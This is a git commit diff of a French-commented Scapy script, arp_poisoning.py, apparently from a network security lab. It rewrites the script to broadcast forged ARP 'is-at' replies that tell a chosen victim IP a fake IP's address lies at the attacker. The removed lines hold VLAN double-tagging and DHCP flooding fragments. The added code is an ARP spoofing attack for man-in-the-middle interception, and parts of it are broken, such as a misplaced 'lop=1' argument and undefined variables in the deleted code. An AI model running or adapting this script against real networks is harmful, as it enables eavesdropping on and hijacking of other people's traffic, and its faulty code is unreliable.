1a9fa66cf618940ae6c313e114124b42e4417322
GUXXdx <noah972m@gmail.com>
2026-02-19 11:48:06 +0100

    commit

--- arp_poisoning.py
+++ arp_poisoning.py
@@ -6,54 +6,26 @@ import argparse
 # Arguments
 parser = argparse.ArgumentParser(description="ARP poisoning")
 
-parser.add_argument("ipServerDHCP", help="Adresse IP du serveur DHCP")
-parser.add_argument("network", help="Réseau au format CIDR (ex: 10.1.30.0/24)")
+parser.add_argument("victimeIp", help="Adresse IP de la victime")
+parser.add_argument("fakeIp", help="Fake Ip")
 
 args = parser.parse_args()
 
 
-
-
 # Variables
-networkInterface="enp0s9"
 
-ipSource = "10.1.10.12" #my own ip
-macSource ="00:50:79:66:68:01"
+victimeIp=args.victimeIp
+fakeIp=args.fakeIp
 
-ipDestination = '10.1.10.10'
-macDest = "00:50:79:66:68:03"
-
-
-
-send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
-      /ARP(op="who-has", psrc=gateway, pdst=client),
-      inter=RandNum(10,40), loop=1 )
-
-    
-
-
-# List all ips in the network
-possibleIps = [str(ip) for ip in ipaddress.IPv4Network(network)]
-
-# Proceed to build all the dhcp request and to send them
-for ip in possibleIps:
-
-    macSrc=RandMAC()
-
-
-    ethernet = Ether(
-        src=macSource,
-        dst=macDest
+send(
+    Ether(dst="ff:ff:ff:ff:ff:ff")/
+    ARP(
+        op="is-at",
+        psrc=fakeIp, 
+        pdst=victimeIp,
+        lop=1
         )
-
-    internetProtocol = IP(
-        src=ipSource,
-        dst=ipDestination
-        )
-
-    arp = ARP(
-        op=2,
-        psrc=
     )
+
 
 
